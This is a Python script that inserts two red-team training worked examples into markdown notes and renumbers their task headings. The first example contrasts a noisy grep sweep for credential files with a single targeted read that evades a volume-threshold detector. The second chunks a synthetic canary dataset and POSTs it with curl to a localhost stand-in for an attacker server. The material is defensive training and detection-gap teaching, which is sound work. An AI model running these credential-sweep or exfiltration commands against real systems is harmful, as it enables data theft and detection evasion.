#!/usr/bin/env python3
"""Offensive Security worked examples — batch 11 (Red Team objectives)."""
import re
import sys

CREDACCESS = '''## Worked Example: The Same Objective, Loud and Quiet

In a red-team operation, reaching the objective is rarely the hard part — reaching
it without generating the telemetry that ends the engagement is. The difference
between a loud and a quiet approach to the same credential is measurable, and a
small file tree with an access log makes it so. One file holds the objective; the
rest are decoys.

**The loud approach** sweeps for anything that looks like a secret:

```shell-session
operator@lab:/tmp/rtcl-lab$ grep -rl 'password\\|note' . | while read f; do echo "access $f" >> access.log; done
operator@lab:/tmp/rtcl-lab$ grep -c '^access' access.log
6
```

Six file reads to find one credential. The sweep works — it will find the target —
but it touches every sensitive-looking file in the tree, and each read is an event
some monitor can see. On a real host this is `find / -name '*.conf'` and its
relatives: comprehensive, and exactly the pattern detection is tuned for.

**The quiet approach** reads only the path the operator already identified:

```shell-session
operator@lab:/tmp/rtcl-lab$ cat opt/config.ini >/dev/null; echo "access opt/config.ini" >> access.log
operator@lab:/tmp/rtcl-lab$ grep -c '^access' access.log
1
```

One read. Same credential obtained. The prerequisite — knowing where to look —
was paid earlier, in reconnaissance, so the acquisition itself is a single
in-context file access indistinguishable from normal use.

**What a simple detector does with each** is the whole point:

```shell-session
operator@lab:/tmp/rtcl-lab$ echo "rule: >3 sensitive reads in a short window = credential-sweep alert"
operator@lab:/tmp/rtcl-lab$ # loud run: 6 reads -> ALERT ;  quiet run: 1 read -> under threshold -> silent
```

The loud sweep trips a volume threshold; the quiet read stays under it. That gap
is the finding, and note which direction it points: the alert exists and works
against the noisy technique, and the deficiency is the *absence* of low-volume
detection — a single anomalous read of a credential file by a process that has no
business opening it. The report's value to the defender is not "we got the
password" but "the noisy path is caught and the targeted one is not; here is the
low-and-slow behaviour your detection does not cover." That framing turns an
attack into a detection-engineering requirement, which is what a mature red team
delivers.

'''

EXFIL = '''## Worked Example: Measuring an Exfil Channel by Its Detection Signature

Exfiltration simulation is not about moving data — it is about characterising how
*detectable* a given channel is, so the defender learns which ones they can see.
A synthetic crown-jewel dataset, tagged with honeytokens and sent to a local
collector, lets the whole transfer be measured without a byte of real data leaving
anywhere.

**The dataset is entirely synthetic**, and tagged so any copy is recognisable:

```shell-session
operator@lab:/tmp/exfil-lab$ head -1 crown.csv; wc -l < crown.csv
CANARY-RECORD-0000
200
```

Every record carries the `CANARY` marker — a honeytoken. Nothing here is real
customer data, which is the non-negotiable rule of exfil testing: you simulate the
movement of crown jewels, you never move actual crown jewels.

**The transfer** chunks the file and posts each piece to a collector standing in
for the attacker's server:

```shell-session
operator@lab:/tmp/exfil-lab$ split -l 40 crown.csv chunk_
operator@lab:/tmp/exfil-lab$ for c in chunk_*; do curl -s -X POST --data-binary @"$c" http://127.0.0.1:9200/ >/dev/null; done
operator@lab:/tmp/exfil-lab$ grep -c chunk ingress.log
5
```

Five chunks sent and five received — a working bulk channel over HTTP. This is the
baseline: high bandwidth, simple to build, and the most visible option available.

**The measurement** is the deliverable, not the transfer:

```shell-session
operator@lab:/tmp/exfil-lab$ awk '{s+=$2} END{print s" bytes across "NR" POSTs to one host"}' ingress.log
4180 bytes across 5 POSTs to one host
operator@lab:/tmp/exfil-lab$ grep -q CANARY crown.csv && echo "honeytoken present -> content detection would fire"
honeytoken present -> content detection would fire
```

Two independent signals make this channel detectable, and naming both is the
point. Volume: several kilobytes to a single destination in a tight window is what
an egress or DLP rule watches for. Content: the honeytoken means that even
encrypted, a decrypting proxy or an endpoint agent that sees the plaintext can
match the marker. A defender who catches this transfer caught it in two ways.

Which frames the real finding — the *gap*. This channel is loud and catchable, so
the interesting question for the next test is the quiet one: does the same data
leave undetected over DNS, in small pieces spread across hours, or blended into
normal HTTPS to an allowed domain? An exfil simulation earns its keep by ranking
the organisation's channels from most to least detectable, so remediation starts
with the blind spot rather than the one already covered.

'''

WORK = {
    "Offensive Security/Red Team Operations/Lateral Operations & Objectives/Red Team Credential Access & Lateral Movement.md": CREDACCESS,
    "Offensive Security/Red Team Operations/Lateral Operations & Objectives/Data Collection & Exfiltration Simulation.md": EXFIL,
}

ANCHOR = re.compile(r"^## Task \d+ — (Failure Modes|Security Implications|Detection|Defen|Reporting)", re.M)
ANY_TASK = re.compile(r"^## Task \d+ — (.*)$", re.M)


def main():
    apply = "--apply" in sys.argv
    for rel, sec in WORK.items():
        try:
            src = open(rel, encoding="utf-8").read()
        except FileNotFoundError:
            print(f"  MISSING  {rel}")
            continue
        m = ANCHOR.search(src)
        if not m:
            print(f"  ✗ NO ANCHOR  {rel}")
            continue
        out = src[:m.start()] + sec + src[m.start():]
        out = out.replace("## Worked Example:", "## Task 0 — Worked Example:", 1)
        n = [0]

        def renum(mm):
            n[0] += 1
            return f"## Task {n[0]} — {mm.group(1)}"

        out = ANY_TASK.sub(renum, out)
        print(f"  ✓ {n[0]} tasks  {rel.split('/')[-1]}")
        if apply:
            open(rel, "w", encoding="utf-8").write(out)
    print(f"\n{'APPLIED' if apply else 'DRY RUN'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
